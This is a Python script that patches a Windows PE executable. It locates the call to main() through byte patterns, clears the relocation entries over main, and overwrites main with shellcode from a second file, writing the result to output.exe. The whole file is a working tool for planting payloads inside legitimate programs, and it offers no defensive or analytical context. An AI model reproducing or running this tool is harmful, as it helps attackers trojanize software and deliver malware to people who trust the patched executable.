import re
import argparse
import pefile


def extract_patterns_and_m_values(file_path):
    patterns = {}

    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()
        sections = content.strip().split('\n\n')
        for section in sections:
            pattern_match = re.search(r'Pattern:\s*(.+)', section)
            m_values = re.findall(r'm=[+-]([0-9A-Fa-f]+)', section)

            if pattern_match:
                pattern = pattern_match.group(1).strip()
                filtered_m_values = [
                    m.strip() for m in m_values if re.match(r'.*[0-9A-Fa-f]$', m.strip())
                ]
                if filtered_m_values:
                    patterns[pattern] = filtered_m_values
    return patterns


def search_bytes_in_file(data, pattern):
    pattern = pattern.replace('..', r'.{1}')
    pattern = re.sub(r'([0-9A-Fa-f]{2})', r'\\x\1', pattern)
    regex = bytes(pattern, 'utf-8')
    match = re.search(regex, data)
    return match


def get_main_offset(data, pattern_path):
    patterns = extract_patterns_and_m_values(pattern_path)

    for pattern, m_values in patterns.items():
        match = search_bytes_in_file(data, pattern)
        if match:
            # print(match.start())
            for m in m_values:
                if data[match.start() + int(m, 16)] == 0xE8:
                    call_main_offset = match.start() + int(m, 16)
                    return call_main_offset
    return 0


def modify_relocation_entries(pe, target_rva_start, target_rva_end):
    if not hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'):
        print("No Base Relocation Table found.")
        return

    for base_reloc in pe.DIRECTORY_ENTRY_BASERELOC:
        new_entries = []  
        for entry in base_reloc.entries:
            entry_rva = entry.rva
            # print(f"Modifying Relocation Entry RVA: 0x{entry_rva:X}")
            if target_rva_start <= entry_rva <= target_rva_end:
                # print(f"Modifying Relocation Entry RVA: 0x{entry_rva:X}")
                entry.type = 0
                entry.rva = 0
            else:
                new_entries.append(entry)
        base_reloc.entries = new_entries


def patch_pe(pe_file_path, shellcode_path):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()
    shellcode_size = len(shellcode)

    pe = pefile.PE(pe_file_path)
    with open(pe_file_path, 'rb') as f:
        data = f.read()

    file_type = 32 if pe.FILE_HEADER.Machine == pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386'] else 64
    pattern_path = 'pe.txt' if file_type == 32 else 'pe64.txt'

    call_main_offset = get_main_offset(data, pattern_path)
    if call_main_offset == 0:
        print("Cant pattern crt or main!")
    else:
        call_main_rva = pe.get_rva_from_offset(call_main_offset)
        relative_offset = int.from_bytes(data[call_main_offset + 1: call_main_offset + 5], 'little', signed=True)

        main_rva = call_main_rva + relative_offset + 5
        main_offset = pe.get_offset_from_rva(main_rva)
        print(f"Main RVA: 0x{main_rva:X}, Main offset: 0x{main_offset:X}")

        modify_relocation_entries(pe, main_rva, main_rva + shellcode_size)
        output_file_path = 'output.exe'
        pe.write(output_file_path)
        with open(output_file_path, 'rb+') as f:
            f.seek(main_offset)
            f.write(shellcode)
        print(f"Patch PE file saved as: {output_file_path}")
        

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('pe_file_path', help='pe_file_path')
    parser.add_argument('shellcode_path', help='stage_shellcode_path')
    args = parser.parse_args()
    patch_pe(args.pe_file_path, args.shellcode_path)
    
    



